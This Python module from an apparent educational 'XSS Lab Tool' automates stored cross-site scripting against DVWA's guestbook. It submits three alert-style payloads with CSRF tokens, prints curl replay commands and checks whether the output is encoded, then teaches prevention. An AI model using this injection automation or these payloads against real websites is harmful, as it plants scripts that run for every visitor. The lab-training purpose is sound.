"""
Stored XSS module for XSS Lab Tool.
Demonstrates and teaches stored (persistent) XSS attacks.
"""

import shlex
import textwrap
from typing import Optional
from ..explanations.text_blocks import XSSExplanations


class StoredXSSModule:
    """Interactive module for teaching Stored XSS."""

    def __init__(self, http_client, logger, target_config, auth):
        """
        Initialize Stored XSS module.

        Args:
            http_client: HTTPClient instance
            logger: DualLogger instance
            target_config: TargetConfig instance
            auth: DVWAAuthenticator instance (for CSRF tokens)
        """
        self.http = http_client
        self.logger = logger
        self.config = target_config
        self.auth = auth
        self.explanations = XSSExplanations()

        # DVWA stored XSS page path
        self.xss_stored_path = "vulnerabilities/xss_s/"

        # Payloads for stored XSS
        self.payloads = [
            ("<script>alert('Stored XSS')</script>", "Basic script injection"),
            ("<img src=x onerror=alert('XSS')>", "Image error handler"),
            ("<svg/onload=alert('XSS')>", "SVG onload event"),
        ]
        self._injection_details_logged = False

    def run_interactive(self, interactive: bool = True) -> bool:
        """
        Run the stored XSS module interactively.

        Args:
            interactive: If True, pause for user confirmation at key steps

        Returns:
            True if at least one payload succeeded
        """
        self.logger.educational("", "STORED XSS MODULE")
        self.logger.educational(self.explanations.STORED_XSS_INTRO)

        # Step 1: Introduce the vulnerability
        self.logger.step(
            1,
            "Understanding Stored XSS",
            "We're going to examine DVWA's Stored XSS page (Guestbook). This page allows\n"
            "users to post messages that are stored in a database and displayed to all visitors.\n\n"
            "If the application doesn't sanitize input properly, we can store malicious\n"
            "JavaScript that will execute for EVERY user who views the page."
        )

        if interactive and not self._get_user_approval("Proceed to examine the guestbook?"):
            self.logger.educational("Module stopped by user.")
            return False

        # Step 2: View current guestbook entries
        self.logger.step(
            2,
            "Viewing Current Guestbook Entries",
            "First, let's see what's currently in the guestbook."
        )

        url = self.config.get_dvwa_url(self.xss_stored_path)
        response = self.http.get(url)

        if not response:
            self.logger.explain_failure(
                "Failed to reach guestbook page",
                "The HTTP request to the stored XSS page failed.",
                "Verify DVWA is running and you're authenticated"
            )
            return False

        self.logger.educational("✓ Successfully accessed guestbook page")

        if not self._injection_details_logged:
            self._log_injection_breakdown()
            self._injection_details_logged = True

        # Step 3: Explain the attack flow
        self.logger.educational(self.explanations.STORED_XSS_IMPACT)

        if interactive and not self._get_user_approval("\nProceed to attempt stored XSS injection?"):
            self.logger.educational("Module stopped by user.")
            return False

        # Step 4: Attempt to inject stored XSS
        success = False
        for i, (payload, description) in enumerate(self.payloads, start=1):
            if self._attempt_stored_payload(payload, description, i, interactive):
                success = True
                break  # Stop after first success

        # Step 5: Prevention education
        if success:
            self.logger.educational("\n" + "="*70)
            self.logger.educational(self.explanations.STORED_XSS_PREVENTION)

        return success

    def _attempt_stored_payload(self, payload: str, description: str, attempt_num: int, interactive: bool) -> bool:
        """
        Attempt to store and trigger an XSS payload.

        Args:
            payload: The XSS payload to store
            description: Description of the payload
            attempt_num: Attempt number
            interactive: Whether to ask for confirmation

        Returns:
            True if payload succeeded
        """
        self.logger.step(
            3 + attempt_num,
            f"Stored XSS Attempt {attempt_num}",
            f"Let's try storing this payload in the guestbook:"
        )

        self.logger.payload(payload, description)

        if interactive and not self._get_user_approval(f"\nStore this payload in the guestbook?"):
            self.logger.educational("Payload skipped by user.\n")
            return False

        # Step A: Submit the payload
        self.logger.educational("\n→ Submitting payload to guestbook...")

        url = self.config.get_dvwa_url(self.xss_stored_path)

        # Get CSRF token for the form
        csrf_token = self.auth.get_csrf_token(url)

        # Prepare form data and append user-agent marker for attribution
        ua_string = self.http.get_user_agent()
        annotated_payload = f"{payload}\n<!-- UA: {ua_string} -->"
        form_data = {
            'txtName': 'XSS Test User',
            'mtxMessage': annotated_payload,
            'btnSign': 'Sign Guestbook'
        }

        if csrf_token:
            form_data['user_token'] = csrf_token

        self.logger.educational(f"User-Agent recorded with this entry: {ua_string}")
        self._log_curl_examples("POST", url, data=form_data, include_cookies=True)

        # Submit the payload
        response = self.http.post(url, data=form_data)

        if not response:
            self.logger.explain_failure(
                f"Failed to submit payload {attempt_num}",
                "HTTP POST request failed",
                "Check connection to DVWA"
            )
            return False

        self.logger.educational("✓ Payload submitted successfully")

        # Step B: Retrieve the page to see if payload is stored and executed
        self.logger.educational("\n→ Retrieving guestbook to check if payload persists...")

        response = self.http.get(url)

        self._log_curl_examples("GET", url, include_cookies=True)

        if not response:
            self.logger.explain_failure(
                "Failed to retrieve guestbook after submission",
                "Could not verify if payload was stored",
                "Try accessing the page manually"
            )
            return False

        # Check if payload appears in response
        if payload in response.text:
            self.logger.explain_success(
                f"Stored XSS payload {attempt_num} succeeded!",
                f"The payload '{payload}' is now PERMANENTLY stored in the database.\n\n"
                f"Critical difference from Reflected XSS:\n"
                f"  - Reflected: Victim must click malicious link\n"
                f"  - Stored: EVERY visitor automatically affected\n\n"
                f"Attack timeline:\n"
                f"  1. Attacker stores malicious script (just happened)\n"
                f"  2. Script is saved to database\n"
                f"  3. ANY user who views this page executes the script\n"
                f"  4. No further action needed from attacker\n\n"
                f"In a real scenario, this could:\n"
                f"  - Steal session cookies from all visitors\n"
                f"  - Create a worm (script that posts itself)\n"
                f"  - Redirect users to phishing pages\n"
                f"  - Modify page content for all users"
            )
            self._log_http_evidence(response, payload, "stored entry rendered in body")
            return True
        else:
            # Check if it's encoded
            encoded_check = payload.replace('<', '&lt;').replace('>', '&gt;')
            if encoded_check in response.text:
                self.logger.explain_failure(
                    f"Payload {attempt_num} was stored but ENCODED",
                    "The payload was saved to the database, but when displayed, special\n"
                    "characters were encoded (< becomes &lt;, > becomes &gt;).\n\n"
                    "This is actually GOOD security practice - it prevents XSS while\n"
                    "preserving the data. The current DVWA security level is doing output encoding.",
                    f"Try a different payload or lower security level" if attempt_num < len(self.payloads) else None
                )
                self._log_http_evidence(response, payload, "payload encoded before rendering")
            else:
                self.logger.explain_failure(
                    f"Payload {attempt_num} may have been filtered",
                    "The payload does not appear in the response at all, suggesting:\n"
                    "  - Input filtering removed dangerous strings\n"
                    "  - Payload was rejected before storage\n"
                    "  - Higher security level prevented storage",
                    f"Try alternative payload" if attempt_num < len(self.payloads) else None
                )
                self._log_http_evidence(response, payload, "payload missing from rendered output")

        return False

    def _log_injection_breakdown(self):
        """Explain exactly where the stored payload lands."""
        url = self.config.get_dvwa_url(self.xss_stored_path)
        breakdown = [
            f"Target endpoint: {url}",
            "HTTP method: POST to store data, GET to trigger victims.",
            "Request fields: txtName (attacker alias), mtxMessage (payload).",
            "Server writes message to database, then echoes in HTML body for every visitor.",
            "Headers remain untouched; the stored content lives inside the guestbook table rows.",
        ]
        self.logger.educational("Injection breakdown:\n" + "\n".join(f"  - {line}" for line in breakdown))

    def _log_curl_examples(
        self,
        method: str,
        url: str,
        params: Optional[dict] = None,
        data: Optional[dict] = None,
        include_cookies: bool = False,
    ):
        """Show curl commands (direct + Burp) for POST/GET requests."""
        cookie_fragment = self._build_cookie_fragment() if include_cookies else None
        direct = self._build_curl_command(method, url, params, data, cookie_fragment, use_proxy=False)
        burp = self._build_curl_command(method, url, params, data, cookie_fragment, use_proxy=True)
        self.logger.educational(
            "Replay with curl (add this to Burp if desired):\n"
            f"  direct : {direct}\n"
            f"  via Burp: {burp}\n"
        )

    def _build_curl_command(
        self,
        method: str,
        url: str,
        params: Optional[dict],
        data: Optional[dict],
        cookie_fragment: Optional[str],
        use_proxy: bool,
    ) -> str:
        """Construct a curl command string."""
        parts = ["curl", "-sS"]
        if use_proxy:
            parts.extend(["--proxy", "http://127.0.0.1:8080"])

        if cookie_fragment:
            parts.extend(["--cookie", shlex.quote(cookie_fragment)])

        if method.upper() == "GET":
            parts.extend(["-G", shlex.quote(url)])
            for key, value in (params or {}).items():
                safe_value = str(value).replace("\n", "\\n")
                parts.extend(["--data-urlencode", shlex.quote(f"{key}={safe_value}")])
        else:
            parts.extend(["-X", method.upper(), shlex.quote(url)])
            for key, value in (data or {}).items():
                safe_value = str(value).replace("\n", "\\n")
                parts.extend(["-d", shlex.quote(f"{key}={safe_value}")])

        return " ".join(parts)

    def _build_cookie_fragment(self) -> str:
        """Return a cookie string (or placeholder) for curl reproduction."""
        cookie_pairs = []
        for name in ['PHPSESSID', 'security']:
            value = self.http.get_cookie(name)
            if value:
                cookie_pairs.append(f"{name}={value}")
        if not cookie_pairs:
            cookie_pairs.append("PHPSESSID=<copy-from-browser>")
        return "; ".join(cookie_pairs)

    def _log_http_evidence(self, response, payload: str, note: str):
        """Show HTTP evidence that the stored payload rendered."""
        snippet, hint = self._extract_payload_snippet(response.text, payload)
        interesting_headers = []
        for header in ["Content-Type", "Server", "Date"]:
            if header in response.headers:
                interesting_headers.append(f"{header}: {response.headers[header]}")
        header_text = "\n".join(f"  {line}" for line in interesting_headers) or "  (no headers sampled)"
        body_text = textwrap.indent(snippet, "    ")

        self.logger.educational(
            f"HTTP evidence ({note}):\n"
            f"  Status: {response.status_code}\n"
            f"{header_text}\n"
            f"  Body excerpt ({hint}):\n{body_text}\n"
        )

    def _extract_payload_snippet(self, body: str, payload: str, radius: int = 160):
        """Return a snippet that highlights the payload."""
        index = body.find(payload)
        if index == -1:
            snippet = body[:radius] or "(empty response body)"
            return snippet.strip(), "payload not present; showing leading bytes"

        start = max(index - radius // 2, 0)
        end = min(index + len(payload) + radius // 2, len(body))
        snippet = body[start:end].replace(payload, f"<<PAYLOAD>>{payload}<<PAYLOAD>>")
        return snippet.strip(), "payload highlighted with <<PAYLOAD>> markers"

    def _get_user_approval(self, prompt: str) -> bool:
        """
        Ask user for approval to proceed.

        Args:
            prompt: Prompt to display

        Returns:
            True if user approves, False otherwise
        """
        try:
            response = input(f"\n{prompt} [y/N]: ").strip().lower()
            self.logger.operational(f"User response to '{prompt}': {response}", "INFO")
            return response in ['y', 'yes']
        except (KeyboardInterrupt, EOFError):
            self.logger.operational("User interrupted", "INFO")
            return False

    def get_target_url(self) -> str:
        """Get the full URL for the stored XSS page."""
        return self.config.get_dvwa_url(self.xss_stored_path)
